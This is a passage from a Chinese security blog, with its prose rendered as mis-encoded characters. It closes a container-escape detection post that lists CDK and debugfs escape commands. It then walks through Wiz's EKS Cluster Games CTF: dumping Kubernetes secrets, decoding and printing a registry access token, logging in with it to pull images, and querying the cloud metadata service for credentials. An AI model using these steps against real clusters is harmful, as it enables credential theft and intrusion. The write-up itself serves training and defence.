<h2 id="ç‰¹å¾æå–"><a href="#ç‰¹å¾æå–" class="headerlink" title="ç‰¹å¾æå–"></a>ç‰¹å¾æå–</h2><h3 id="è¿›ç¨‹ç‰¹å¾"><a href="#è¿›ç¨‹ç‰¹å¾" class="headerlink" title="è¿›ç¨‹ç‰¹å¾"></a>è¿›ç¨‹ç‰¹å¾</h3><p>ï¼ˆè¿™é‡Œæ¢æˆäº†ubuntué•œåƒå¥½æŸ¥çœ‹è¿›ç¨‹ç»†èŠ‚ï¼‰</p>
<p>è¿™ä¸ªä¸æ˜¯çŸ­è¿›ç¨‹ï¼ŒæŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯ï¼Œ&#x2F;bin&#x2F;bashä¸ºçˆ¶è¿›ç¨‹ï¼Œdebugfsä¸ºå­è¿›ç¨‹ï¼ˆå‚æ•°ä¸º-w cdk-testï¼Œå¦‚æœæ˜¯ä½¿ç”¨cdkåˆ™å‚æ•°å›ºå®šä¸º-w host_devï¼‰</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116175344403.png" alt="image-20240116175344403"></p>
<h3 id="å‘½ä»¤ç‰¹å¾"><a href="#å‘½ä»¤ç‰¹å¾" class="headerlink" title="å‘½ä»¤ç‰¹å¾"></a>å‘½ä»¤ç‰¹å¾</h3><p>ä»¥ä¸‹çš„å‘½ä»¤éƒ½æ˜¯å›ºå®šçš„ï¼Œä¹Ÿæ˜¯ç”±äºCDKå†…ç½®çš„åŸå› </p>
<p>.&#x2F;cdk run lxcfs-rw</p>
<p> debugfs -w host_dev</p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-01-16</span><i class="fa fa-tag"></i><a class="tag" href="/tags/å®¹å™¨å®‰å…¨/" title="å®¹å™¨å®‰å…¨">å®¹å™¨å®‰å…¨ </a><span class="leancloud_visitors"></span><span>About 499 words, 1 min 39 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/12/30/%E4%BB%8EEKS-CTF%E7%9C%8B%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/">ä»EKS-CTFçœ‹äº‘åŸç”Ÿå®‰å…¨</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
<h1 id="Wiz-eksclustergames"><a href="#Wiz-eksclustergames" class="headerlink" title="Wiz-eksclustergames"></a>Wiz-eksclustergames</h1><p>å›½å¤–äº‘å®‰å…¨å‚å•†Wizä¸¾åŠäº†â€œEKS Cluster Gamesâ€â€”â€”ä¸€é¡¹äº‘å®‰å…¨å¤ºæ—— (CTF) æ´»åŠ¨ã€‚è¯¥æŒ‘æˆ˜ç”±äº”ç§ä¸åŒçš„åœºæ™¯ç»„æˆï¼Œæ¯ç§åœºæ™¯éƒ½ä¾§é‡äºå¯èƒ½çš„ Amazon EKS é—®é¢˜ã€‚å‚ä¸è€…å°†æ‰®æ¼”æ”»å‡»è€…ï¼Œäº†è§£è¿™äº›é”™è¯¯é…ç½®å’Œå®‰å…¨é—®é¢˜ï¼Œç„¶ååœ¨å—æ§ç¯å¢ƒä¸­åˆ©ç”¨å®ƒä»¬ã€‚ </p>
<h2 id="1-ç¬¬ä¸€éƒ¨åˆ†"><a href="#1-ç¬¬ä¸€éƒ¨åˆ†" class="headerlink" title="1. ç¬¬ä¸€éƒ¨åˆ†"></a>1. ç¬¬ä¸€éƒ¨åˆ†</h2><h3 id="Secret-Seeker-å¯»æ‰¾ç§˜å¯†"><a href="#Secret-Seeker-å¯»æ‰¾ç§˜å¯†" class="headerlink" title="Secret Seeker å¯»æ‰¾ç§˜å¯†"></a>Secret Seeker å¯»æ‰¾ç§˜å¯†</h3><p>Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?</p>
<h4 id="1-1-ä½¿ç”¨kubectlå‘½ä»¤è·å–å½“å‰å‘½åç©ºé—´ä¸‹çš„secretï¼ˆç”±äºæˆ‘ä»¬åªæœ‰è¿™äº›æƒé™ï¼‰"><a href="#1-1-ä½¿ç”¨kubectlå‘½ä»¤è·å–å½“å‰å‘½åç©ºé—´ä¸‹çš„secretï¼ˆç”±äºæˆ‘ä»¬åªæœ‰è¿™äº›æƒé™ï¼‰" class="headerlink" title="1.1 ä½¿ç”¨kubectlå‘½ä»¤è·å–å½“å‰å‘½åç©ºé—´ä¸‹çš„secretï¼ˆç”±äºæˆ‘ä»¬åªæœ‰è¿™äº›æƒé™ï¼‰"></a>1.1 ä½¿ç”¨kubectlå‘½ä»¤è·å–å½“å‰å‘½åç©ºé—´ä¸‹çš„secretï¼ˆç”±äºæˆ‘ä»¬åªæœ‰è¿™äº›æƒé™ï¼‰</h4><p>æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl auth can-i --list</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231229095046674.png" alt="image-20231229095046674"></p>
<p>æŸ¥çœ‹secrets</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get secrets -o yaml</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228131714241.png" alt="image-20231228131714241"></p>
<h2 id="2-ç¬¬äºŒéƒ¨åˆ†"><a href="#2-ç¬¬äºŒéƒ¨åˆ†" class="headerlink" title="2. ç¬¬äºŒéƒ¨åˆ†"></a>2. ç¬¬äºŒéƒ¨åˆ†</h2><p>æ ¹æ®çœŸå®äº‹ä»¶æ”¹ç¼–</p>
<p>Wizåœ¨ä¸<a target="_blank" rel="noopener" href="https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r">é˜¿é‡Œäº‘</a>å’Œ<a target="_blank" rel="noopener" href="https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql">IBM Cloud</a>çš„åˆä½œä¸­æˆåŠŸåœ°ä½¿ç”¨äº†è¯¥æŠ€æœ¯æ¥è·å–å†…éƒ¨å®¹å™¨æ˜ åƒå¹¶è¯æ˜å¯¹è·¨ç§Ÿæˆ·æ•°æ®çš„æœªç»æˆæƒçš„è®¿é—®ã€‚</p>
<h3 id="Registry-Hunt-ä»“åº“ç‹©çŒ"><a href="#Registry-Hunt-ä»“åº“ç‹©çŒ" class="headerlink" title="Registry Hunt ä»“åº“ç‹©çŒ"></a>Registry Hunt ä»“åº“ç‹©çŒ</h3><p>A thing we learned during our research: always check the container registries.</p>
<p>For your convenience, the <a target="_blank" rel="noopener" href="https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md">crane</a> utility is already pre-installed on the machine.</p>
<p>æ ¹æ®ä¸Šè¿°æè¿°æˆ‘ä»¬çŸ¥é“ç›®æ ‡æ˜¯registry</p>
<h4 id="2-1-æŸ¥çœ‹podç›¸å…³ä¿¡æ¯"><a href="#2-1-æŸ¥çœ‹podç›¸å…³ä¿¡æ¯" class="headerlink" title="2.1 æŸ¥çœ‹podç›¸å…³ä¿¡æ¯"></a>2.1 æŸ¥çœ‹podç›¸å…³ä¿¡æ¯</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228133920832.png" alt="image-20231228133920832"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods -o yaml</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">root@wiz-eks-challenge:~#</span> <span class="string">kubectl</span> <span class="string">get</span> <span class="string">pods</span> <span class="string">-o</span> <span class="string">yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">items:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">annotations:</span></span><br><span class="line">      <span class="attr">kubernetes.io/psp:</span> <span class="string">eks.privileged</span></span><br><span class="line">      <span class="attr">pulumi.com/autonamed:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-11-01T13:32:05Z&quot;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">database-pod-2c9b3a4e</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">challenge2</span></span><br><span class="line">    <span class="attr">resourceVersion:</span> <span class="string">&quot;12166896&quot;</span></span><br><span class="line">    <span class="attr">uid:</span> <span class="string">57fe7d43-5eb3-4554-98da-47340d94b4a6</span></span><br><span class="line">  <span class="attr">spec:</span></span><br><span class="line">    <span class="attr">containers:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">eksclustergames/base_ext_image</span></span><br><span class="line">      <span class="attr">imagePullPolicy:</span> <span class="string">Always</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">my-container</span></span><br><span class="line">      <span class="attr">resources:</span> &#123;&#125;</span><br><span class="line">      <span class="attr">terminationMessagePath:</span> <span class="string">/dev/termination-log</span></span><br><span class="line">      <span class="attr">terminationMessagePolicy:</span> <span class="string">File</span></span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/var/run/secrets/kubernetes.io/serviceaccount</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">kube-api-access-cq4m2</span></span><br><span class="line">        <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">dnsPolicy:</span> <span class="string">ClusterFirst</span></span><br><span class="line">    <span class="attr">enableServiceLinks:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">imagePullSecrets:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">registry-pull-secrets-780bab1d</span></span><br><span class="line">    <span class="attr">nodeName:</span> <span class="string">ip-192-168-21-50.us-west-1.compute.internal</span></span><br><span class="line">    <span class="attr">preemptionPolicy:</span> <span class="string">PreemptLowerPriority</span></span><br><span class="line">    <span class="attr">priority:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">restartPolicy:</span> <span class="string">Always</span></span><br><span class="line">    <span class="attr">schedulerName:</span> <span class="string">default-scheduler</span></span><br><span class="line">    <span class="attr">securityContext:</span> &#123;&#125;</span><br><span class="line">    <span class="attr">serviceAccount:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">serviceAccountName:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">terminationGracePeriodSeconds:</span> <span class="number">30</span></span><br><span class="line">    <span class="attr">tolerations:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">effect:</span> <span class="string">NoExecute</span></span><br><span class="line">      <span class="attr">key:</span> <span class="string">node.kubernetes.io/not-ready</span></span><br><span class="line">      <span class="attr">operator:</span> <span class="string">Exists</span></span><br><span class="line">      <span class="attr">tolerationSeconds:</span> <span class="number">300</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">effect:</span> <span class="string">NoExecute</span></span><br><span class="line">      <span class="attr">key:</span> <span class="string">node.kubernetes.io/unreachable</span></span><br><span class="line">      <span class="attr">operator:</span> <span class="string">Exists</span></span><br><span class="line">      <span class="attr">tolerationSeconds:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">kube-api-access-cq4m2</span></span><br><span class="line">      <span class="attr">projected:</span></span><br><span class="line">        <span class="attr">defaultMode:</span> <span class="number">420</span></span><br><span class="line">        <span class="attr">sources:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">serviceAccountToken:</span></span><br><span class="line">            <span class="attr">expirationSeconds:</span> <span class="number">3607</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">token</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">configMap:</span></span><br><span class="line">            <span class="attr">items:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">ca.crt</span></span><br><span class="line">              <span class="attr">path:</span> <span class="string">ca.crt</span></span><br><span class="line">            <span class="attr">name:</span> <span class="string">kube-root-ca.crt</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">downwardAPI:</span></span><br><span class="line">            <span class="attr">items:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">fieldRef:</span></span><br><span class="line">                <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">                <span class="attr">fieldPath:</span> <span class="string">metadata.namespace</span></span><br><span class="line">              <span class="attr">path:</span> <span class="string">namespace</span></span><br><span class="line">  <span class="attr">status:</span></span><br><span class="line">    <span class="attr">conditions:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">lastProbeTime:</span> <span class="literal">null</span></span><br><span class="line">      <span class="attr">lastTransitionTime:</span> <span class="string">&quot;2023-11-01T13:32:05Z&quot;</span></span><br><span class="line">      <span class="attr">status:</span> <span class="string">&quot;True&quot;</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">Initialized</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">lastProbeTime:</span> <span class="literal">null</span></span><br><span class="line">      <span class="attr">lastTransitionTime:</span> <span class="string">&quot;2023-12-07T19:54:26Z&quot;</span></span><br><span class="line">      <span class="attr">status:</span> <span class="string">&quot;True&quot;</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">Ready</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">lastProbeTime:</span> <span class="literal">null</span></span><br><span class="line">      <span class="attr">lastTransitionTime:</span> <span class="string">&quot;2023-12-07T19:54:26Z&quot;</span></span><br><span class="line">      <span class="attr">status:</span> <span class="string">&quot;True&quot;</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">ContainersReady</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">lastProbeTime:</span> <span class="literal">null</span></span><br><span class="line">      <span class="attr">lastTransitionTime:</span> <span class="string">&quot;2023-11-01T13:32:05Z&quot;</span></span><br><span class="line">      <span class="attr">status:</span> <span class="string">&quot;True&quot;</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">PodScheduled</span></span><br><span class="line">    <span class="attr">containerStatuses:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerID:</span> <span class="string">containerd://8010fe76a2bcad0d49b7d810efd7afdecdf00815a9f5197b651b26ddc5de1eb0</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">docker.io/eksclustergames/base_ext_image:latest</span></span><br><span class="line">      <span class="attr">imageID:</span> <span class="string">docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623</span></span><br><span class="line">      <span class="attr">lastState:</span></span><br><span class="line">        <span class="attr">terminated:</span></span><br><span class="line">          <span class="attr">containerID:</span> <span class="string">containerd://b427307b7f428bcf6a50bb40ebef194ba358f77dbdb3e7025f46be02b922f5af</span></span><br><span class="line">          <span class="attr">exitCode:</span> <span class="number">0</span></span><br><span class="line">          <span class="attr">finishedAt:</span> <span class="string">&quot;2023-12-07T19:54:25Z&quot;</span></span><br><span class="line">          <span class="attr">reason:</span> <span class="string">Completed</span></span><br><span class="line">          <span class="attr">startedAt:</span> <span class="string">&quot;2023-11-01T13:32:08Z&quot;</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">my-container</span></span><br><span class="line">      <span class="attr">ready:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">restartCount:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">started:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">state:</span></span><br><span class="line">        <span class="attr">running:</span></span><br><span class="line">          <span class="attr">startedAt:</span> <span class="string">&quot;2023-12-07T19:54:26Z&quot;</span></span><br><span class="line">    <span class="attr">hostIP:</span> <span class="number">192.168</span><span class="number">.21</span><span class="number">.50</span></span><br><span class="line">    <span class="attr">phase:</span> <span class="string">Running</span></span><br><span class="line">    <span class="attr">podIP:</span> <span class="number">192.168</span><span class="number">.12</span><span class="number">.173</span></span><br><span class="line">    <span class="attr">podIPs:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">ip:</span> <span class="number">192.168</span><span class="number">.12</span><span class="number">.173</span></span><br><span class="line">    <span class="attr">qosClass:</span> <span class="string">BestEffort</span></span><br><span class="line">    <span class="attr">startTime:</span> <span class="string">&quot;2023-11-01T13:32:05Z&quot;</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">List</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">resourceVersion:</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-2-åˆ†ææœ‰ä»·å€¼çš„ä¿¡æ¯"><a href="#2-2-åˆ†ææœ‰ä»·å€¼çš„ä¿¡æ¯" class="headerlink" title="2.2 åˆ†ææœ‰ä»·å€¼çš„ä¿¡æ¯"></a>2.2 åˆ†ææœ‰ä»·å€¼çš„ä¿¡æ¯</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">imagePullSecrets:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">registry-pull-secrets-780bab1d</span></span><br></pre></td></tr></table></figure>

<p>æ ¹æ®<a target="_blank" rel="noopener" href="https://kubernetes.io/zh-cn/docs/tasks/configure-pod-container/pull-image-private-registry/">ä»ç§æœ‰ä»“åº“æ‹‰å–é•œåƒ</a>å¯ä»¥çŸ¥é“è¿™ä¸ªå­—æ®µé…ç½®äº†è¯¥podå°†ä½¿ç”¨ä¸€ä¸ªåä¸ºregistry-pull-secrets-780bab1dçš„secretä»ç§æœ‰é•œåƒä»“åº“æ‹‰å–é•œåƒã€‚</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">containerStatuses:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerID:</span> <span class="string">containerd://8010fe76a2bcad0d49b7d810efd7afdecdf00815a9f5197b651b26ddc5de1eb0</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">docker.io/eksclustergames/base_ext_image:latest</span></span><br><span class="line">      <span class="attr">imageID:</span> <span class="string">docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623</span></span><br><span class="line">      <span class="attr">lastState:</span></span><br><span class="line">        <span class="attr">terminated:</span></span><br><span class="line">          <span class="attr">containerID:</span> <span class="string">containerd://b427307b7f428bcf6a50bb40ebef194ba358f77dbdb3e7025f46be02b922f5af</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€éƒ¨åˆ†å‘Šè¯‰äº†æˆ‘ä»¬å®¹å™¨å’Œé•œåƒçš„åç§°å’Œå…·ä½“ID</p>
<h4 id="2-2-å°è¯•è·å–secretsä¿¡æ¯"><a href="#2-2-å°è¯•è·å–secretsä¿¡æ¯" class="headerlink" title="2.2 å°è¯•è·å–secretsä¿¡æ¯"></a>2.2 å°è¯•è·å–secretsä¿¡æ¯</h4><p>ä¹‹å‰åœ¨çœ‹aquaåšå®¢çš„æ—¶å€™ç¿»åˆ°äº†ä¸€ä¸ªç±»ä¼¼çš„èµ„è®¯ï¼Œè¯·è§å‚è€ƒæ–‡çŒ®</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get secrets registry-pull-secrets-780bab1d -o yaml</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="string">.dockerconfigjson:</span> <span class="string">eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Secret</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">pulumi.com/autonamed:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">  <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-11-01T13:31:29Z&quot;</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">registry-pull-secrets-780bab1d</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">challenge2</span></span><br><span class="line">  <span class="attr">resourceVersion:</span> <span class="string">&quot;897340&quot;</span></span><br><span class="line">  <span class="attr">uid:</span> <span class="string">1348531e-57ff-42df-b074-d9ecd566e18b</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">kubernetes.io/dockerconfigjson</span></span><br></pre></td></tr></table></figure>

<p>æ ¹æ®ä¹‹å‰çš„å­¦ä¹ æˆ‘çŸ¥é“.dockerconfigjsonä¼šå­˜å‚¨æœ‰ç§æœ‰ä»“åº“çš„authä¿¡æ¯ï¼Œå°†å…¶è¿›è¡Œbase64è§£å¯†å³å¯ã€‚</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;auths&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;index.docker.io/v1/&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;auth&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-3-ç™»é™†ä»“åº“å¹¶pullé•œåƒ"><a href="#2-3-ç™»é™†ä»“åº“å¹¶pullé•œåƒ" class="headerlink" title="2.3 ç™»é™†ä»“åº“å¹¶pullé•œåƒ"></a>2.3 ç™»é™†ä»“åº“å¹¶pullé•œåƒ</h4><h5 id="dockerçš„æ–¹å¼"><a href="#dockerçš„æ–¹å¼" class="headerlink" title="dockerçš„æ–¹å¼"></a>dockerçš„æ–¹å¼</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker login -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo</span><br><span class="line">docker pull eksclustergames/base_ext_image:latest</span><br><span class="line">docker run -it eksclustergames/base_ext_image /bin/bash</span><br></pre></td></tr></table></figure>

<p>åœ¨å·¥ä½œç›®å½•ä¸‹æ‰¾åˆ°äº†flag.txt</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228142957530.png" alt="image-20231228142957530"></p>
<h5 id="craneçš„æ–¹å¼"><a href="#craneçš„æ–¹å¼" class="headerlink" title="craneçš„æ–¹å¼"></a>craneçš„æ–¹å¼</h5><p>å…ˆå°†é•œåƒä»¥taråŒ…æ–¹å¼å¯¼å‡º</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crane <span class="built_in">export</span> 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 test.tar</span><br></pre></td></tr></table></figure>

<p>å†è§£åŒ…</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf test.tar</span><br></pre></td></tr></table></figure>

<p>å°±å¯ä»¥çœ‹åˆ°flag.txtäº†</p>
<h2 id="3-ç¬¬ä¸‰éƒ¨åˆ†"><a href="#3-ç¬¬ä¸‰éƒ¨åˆ†" class="headerlink" title="3. ç¬¬ä¸‰éƒ¨åˆ†"></a>3. ç¬¬ä¸‰éƒ¨åˆ†</h2><p>åœ¨æ­¤æŒ‘æˆ˜ä¸­ï¼Œæ‚¨ä»å®ä¾‹å…ƒæ•°æ®æœåŠ¡ (IMDS) æ£€ç´¢äº†å‡­æ®ã€‚å±•æœ›æœªæ¥ï¼Œè¿™äº›å‡­æ®å°†åœ¨ Pod ä¸­éšæ—¶å¯ç”¨ï¼Œä»¥ä¾¿æ‚¨è½»æ¾ä½¿ç”¨ã€‚</p>
<h3 id="Image-Inquisition-é•œåƒæ¸—é€"><a href="#Image-Inquisition-é•œåƒæ¸—é€" class="headerlink" title="Image Inquisition é•œåƒæ¸—é€"></a>Image Inquisition é•œåƒæ¸—é€</h3><p>A podâ€™s image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.</p>
<p>Remember: You are running inside a compromised EKS pod.</p>
<p>For your convenience, the <a target="_blank" rel="noopener" href="https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md">crane</a> utility is already pre-installed on the machine.</p>
<p>è¿™é‡Œå‚è€ƒäº†è…¾è®¯äº‘çš„ä¸€ç¯‡æ–‡ç« ï¼Œæ ¹æ®æ–‡ç« æåŠçš„æ‰‹æ³•è¿›è¡Œæ¸—é€ï¼Œè¯·è§å‚è€ƒæ–‡çŒ®éƒ¨åˆ†</p>
<h4 id="3-1-ä¿¡æ¯æ”¶é›†"><a href="#3-1-ä¿¡æ¯æ”¶é›†" class="headerlink" title="3.1 ä¿¡æ¯æ”¶é›†"></a>3.1 ä¿¡æ¯æ”¶é›†</h4><p>æŸ¥çœ‹æ‰€æœ‰ç±»åˆ«çš„å…ƒæ•°æ®</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://169.254.169.254/latest/meta-data/</span><br></pre></td></tr></table></figure>

